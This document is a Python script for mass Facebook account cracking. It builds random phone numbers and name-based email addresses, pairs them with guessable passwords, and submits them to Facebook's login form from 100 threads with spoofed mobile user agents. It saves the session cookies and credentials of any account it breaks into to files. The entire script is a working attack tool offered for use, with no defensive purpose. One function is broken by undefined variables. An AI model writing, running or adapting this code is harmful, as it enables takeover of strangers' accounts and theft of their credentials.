import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
#Dalvik/2.1.0 (Linux; U; Android 13; SM-G770F Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/bg_BG;FBBV/548243065;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G770F;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2163};FB_FW/1:;]
ugen=[]
for xd in range(10000):
    a='Dalvik/2.1.0 (Linux; U; Android'
    b=random.choice(['8','9', '10', '11', '12', '13', '14', '15'])
    c='SM-G770F Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/'
    d=random.randrange(118, 375,)
    e='0'
    f=random.randrange(3000, 6000)
    g=random.randrange(20, 100)
    h='FBBV/548243065;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G770F;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2163};FB_FW/1'
    ua=f'{a} {b};{c}{d}.{e}.{f} {h}'
    ugen.append(ua)
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def main():
    os.system('clear')
    print(logo)
    print("  \033[1;32m〘\033[1;97m1\033[1;32m〙 \033[1;97mPHONE NUMBER CLONE          ")
    print("  \033[1;32m〘\033[1;97m2\033[1;32m〙\033[1;97m GMAIL UID CLONE               ")
    print("  \033[1;32m〘\033[1;97m0\033[1;32m〙 \033[1;97mEXIT TOOL                     ")
    linex()
    ZWE = input(f'\033[1;32m  〘\033[1;97m?\033[1;32m〙 \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["2","02"]:
        gmail()
    if ZWE in ["0","X"]:        
        os.system('exit')
def phone():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97m EXAMPLE : \033[1;32m〘\033[1;97m790\033[1;32m〙〘\033[1;97m404\033[1;32m〙〘\033[1;97m678\033[1;32m〙")
    linex()
    code = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97m INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m3000\033[1;32m〙〘\033[1;97m5000\033[1;32m〙〘\033[1;97m10000\033[1;32m〙")
    linex()
    limit=int(input("\033[1;32m  〘\033[1;32m?\033[1;32m〙\033[1;97m INPUT YOUR LIMIT :\033[1;32m "))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=100) as LEE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID       \033[1;32m║ \033[1;32m'+tl+'                   ')
        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCHOICE CODE    \033[1;32m║ \033[1;32m'+code+'             ')
        print(f" \033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
        linex()
        for love in user:
            uid = '09'+code+love
            pwx = [love,code+love[:3],code+love,'kyawkyaw','minmin','warwar','htethtet','chitchit','Myanmar','myanmar','myanmar123','waiwai','zawzaw','aungaung']
            LEE.submit(rcrack,uid,pwx,tl)

def gmail():
    os.system('clear')
    print(logo)
    print("  \033[1;32m〘\033[1;97m1\033[1;32m〙\033[1;97m DIGIT CLONE (Two)               ")
    print("  \033[1;32m〘\033[1;97m2\033[1;32m〙\033[1;97m DIGIT CLONE  (Three)              ")
    print("  \033[1;32m〘\033[1;97m3\033[1;32m〙\033[1;97m DIGIT CLONE (Four)                ") 
    print("  \033[1;32m〘\033[1;97m0\033[1;32m〙\033[1;32m MAIN MENU                 ")    
    linex()
    ZWE = input(f'\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mSELECT :\033[1;32m ')
    if ZWE in ["1","01"]:
        gmail_two()
    if ZWE in ["2","02"]:
        gmail_three()
    if ZWE in ["3","03"]:
        gmail_four()
    if ZWE in ["0","00"]:
        main()        

def gmail_two():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97mtun\033[1;32m〙〘\033[1;97mzaw\033[1;32m〙〘\033[1;97maung\033[1;32m〙 ")
                linex()
                first = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙 \033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97mlin\033[1;32m〙〘\033[1;97mhtet\033[1;32m〙〘\033[1;97mmin\033[1;32m〙 ")
                linex()
                last = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m@gmail.com\033[1;32m║ ║\033[1;97m@yahoo.com\033[1;32m║ ")
                linex()
                domain = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m3000\033[1;32m║ ║\033[1;97m5000\033[1;32m║ ║\033[1;97m10000\033[1;32m║ ")
                linex()
                try:
                        limit=int(input("\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,3))
                        user.append(nmp)                               
                with ThreadPool(max_workers=100) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID       \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCRACK NAME     \033[1;32m║ \033[1;32m'+first+'.'+last+'.xx'+domain+'')
                        print(f"  \033[1;32m〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+last+'.'+digitx+domain
                                pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'123456',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'123456']
                                LEE.submit(rcrack,uid,pwx,tl)        
       
def gmail_three():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97mtun\033[1;32m║ ║\033[1;97mzaw\033[1;32m║ ║\033[1;97maung\033[1;32m║ ")
                linex()
                first = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97mlin\033[1;32m║ ║\033[1;97mhtet\033[1;32m║ ║\033[1;97mmin\033[1;32m║ ")
                linex()
                last = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m@gmail.com\033[1;32m║ ║\033[1;97m@yahoo.com\033[1;32m║ ")
                linex()
                domain = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m3000\033[1;32m║ ║\033[1;97m5000\033[1;32m║ ║\033[1;97m10000\033[1;32m║ ")
                linex()
                try:
                        limit=int(input("\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,4))
                        user.append(nmp)                               
                with ThreadPool(max_workers=50) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID       \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCRACK NAME     \033[1;32m║ \033[1;32m'+first+'.'+last+'.xxx'+domain+'')
                        print(f"  \033[1;32m〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+last+'.'+digitx+domain
                                uid=First+'.'+Last+'.'+digitx+domain
                                pwx=[first+last,First+last+digitx,first+digitx,Fast+digitx,First+Last,first+' '+last,first+'123',First+'123',first+'12345',First+'12345',First+last+'123',First+last+'1234']
                                LEE.submit(rcrack,uid,pwx,tl)
def gmail_four():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97mtun\033[1;32m║ ║\033[1;97mzaw\033[1;32m║ ║\033[1;97maung\033[1;32m║ ")
                linex()
                first = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97mlin\033[1;32m║ ║\033[1;97mhtet\033[1;32m║ ║\033[1;97mmin\033[1;32m║ ")
                linex()
                last = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m@gmail.com\033[1;32m║ ║\033[1;97m@yahoo.com\033[1;32m║ ")
                linex()
                domain = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m3000\033[1;32m║ ║\033[1;97m5000\033[1;32m║ ║\033[1;97m10000\033[1;32m║ ")
                linex()
                try:
                        limit=int(input("\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=50) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID       \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCRACK NAME     \033[1;32m║ \033[1;32m'+first+'.'+last+'.xxxx'+domain+'')
                        print(f"  \033[1;32m〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+last+'.'+digitx+domain
                                pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)                
    
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\r \033[1;32m〘%sZWE-LAY\033[1;32m〙\033[1;34m\033[1;32m〘\033[38;5;195m%s/%s\033[1;32m〙\033[1;32mOK-%s\r'%(bi,loop,tl,len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'sb=itNlZSUh051VpDq_4lvc8x8x; datr=itNlZXcLqFALL1x6WPuRNKGi; fr=18pirhWFpc2pOt8q2.AWXH4KJGJW-vWTNDjMp8Nexz4Rk.BlhrWq.tm.AAA.0.0.Blkhfq.AWVCM0JAkis; wd=677x598',
            'dpr': '1.5',
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/?_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Microsoft Edge";v="120.0.2210.91"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '677',}
            lo = session.post('https://www.facebook.com/login/',headers=headers, data=data).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f"\033[1;32m  〘OK〙  {uid} ▣ {ps}" '  \n\033[1;97m〘COOKIE〙 = \033[1;97m'+coki+  '')
                #print(f"\x1b[1;31m〘USER-AGENT〙{pro} ")
                linex()
                open('/sdcard/TMS-No-HasBeen-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[82:97]
                print(f"\x1b[1;93m  〘CP〙  {uid} ▣ {ps}")
                #print(f"\x1b[1;90m〘USER-AGENT〙{pro} ")
                open('/sdcard/TMS-No-HasBeen-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
        

logo= ("""
\033[1;31;40m               ╔╦╗╔╦╗╔═╗
\033[1;31;40m                ║ ║║║╚═╗
\033[1;31;40m                ╩ ╩ ╩╚═╝
\033[1;35;40m              THZ+SMM=TMS
\033[1;34;40m   ═══════════════════════════════════════
""") 
def linex():
	print(f' \033[1;97m  ═\033[1;32m══════════════════\033[1;97m═\033[1;32m══════════════════\033[1;97m═')

main()
